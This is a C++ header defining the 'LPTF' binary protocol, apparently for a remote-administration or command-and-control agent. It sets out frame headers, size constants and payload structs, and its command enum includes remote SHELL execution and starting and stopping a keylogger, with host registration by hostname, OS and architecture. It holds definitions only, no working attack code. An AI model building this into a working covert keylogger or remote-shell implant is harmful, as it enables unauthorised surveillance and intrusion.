#ifndef LPTF_PROTOCOL
#define LPTF_PROTOCOL

#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

constexpr std::uint8_t LPTF_VERSION = 1;
constexpr std::uint8_t LPTF_HEADER_SIZE =
    sizeof(std::uint8_t) * 6 +
    sizeof(std::uint16_t);  // identifier + version + type + size
constexpr char LPTF_IDENTIFIER[4] = {'L', 'P', 'T', 'F'};
constexpr std::string_view LPTF_IDENTIFIER_STR(LPTF_IDENTIFIER, 4);

constexpr std::size_t REGISTER_FIXED_BYTES =
    sizeof(std::uint16_t) +
    2 * sizeof(std::uint8_t);  // hostname_len + os_type + arch
// constexpr std::uint16_t REGISTER_MAX_HOSTNAME_LEN =
//     static_cast<std::uint16_t>(65535u - REGISTER_FIXED_BYTES);

constexpr std::size_t KMAX_U16_VALUE = 65535u;
constexpr std::uint16_t MAX_VALUE_INT16 =
    static_cast<std::uint16_t>(KMAX_U16_VALUE);
constexpr std::size_t REGISTER_MAX_HOSTNAME_LEN =
    MAX_VALUE_INT16 - REGISTER_FIXED_BYTES;
constexpr std::size_t COMMAND_FIXED_BYTES =
    sizeof(std::uint16_t) * 2 + sizeof(std::uint8_t);  // id + type + data_len
constexpr std::size_t RESPONSE_FIXED_BYTES =
    sizeof(std::uint16_t) * 2 +
    sizeof(std::uint8_t) *
        3;  // id + data_len + status + total_chunks + chunk_index
constexpr std::size_t DATA_FIXED_BYTES =
    sizeof(std::uint16_t) + sizeof(std::uint8_t);
constexpr std::size_t ERROR_FIXED_BYTES =
    sizeof(std::uint16_t) + sizeof(std::uint8_t);



enum class MessageType : std::uint8_t {
  REGISTER = 0,
  DATA = 1,
  COMMAND = 2,
  RESPONSE = 3,
  DISCONNECT = 4,
  ERROR = 5,
  END,  // must always be the last !!
};

enum class CommandType : std::uint8_t {
  OS_INFO = 0,
  RUNNING_PROCESSES = 1,
  SHELL = 2,
  START_KEYLOGGER = 3,
  STOP_KEYLOGGER = 4,
  END,  // must be the last one
};

enum class DataType : std::uint8_t {
  KEYLOGGER = 0,
  END,  // must be the last one
};

enum class ErrorType : std::uint8_t {
  UNKNOWN_TYPE = 0,
  INVALID_FORMAT = 1,
  UNKNOWN_COMMAND = 2,
  EXECUTION_FAILED = 3,
  SIZE_EXCEEDED = 4,
  END,  // must be the last one
};

enum class OSType : std::uint8_t {
  WINDOWS = 0,
  LINUX = 1,
  MAC = 2,
  END,  // must be the last one
};

enum class ArchType : std::uint8_t {
  X86 = 0,
  X64 = 1,
  ARM = 2,
  END,  // must be the last one
};

enum class ResponseStatus : std::uint8_t {
  OK = 0,
  ERROR = 1,
  END,  // must be the last one
};

struct LptfHeader {
  char identifier[4];
  std::uint8_t version;
  MessageType type;
  std::uint16_t size;
};

struct RegisterPayload {
  OSType os_type;
  ArchType arch;
  std::string hostname;
};

struct CommandPayload {
  std::uint16_t id;
  CommandType type;
  std::string data;
};

struct ResponsePayload {
  std::uint16_t id;
  ResponseStatus status;
  std::uint8_t total_chunks;
  std::uint8_t chunk_index;
  std::string data;
};

struct DataPayload {
  DataType subtype;
  std::string data;
};

struct ErrorPayload {
  ErrorType code;
  std::string message;
};

// Generic struct for recv()
struct Frame {
  LptfHeader header;
  std::vector<std::uint8_t> payload;
};

#endif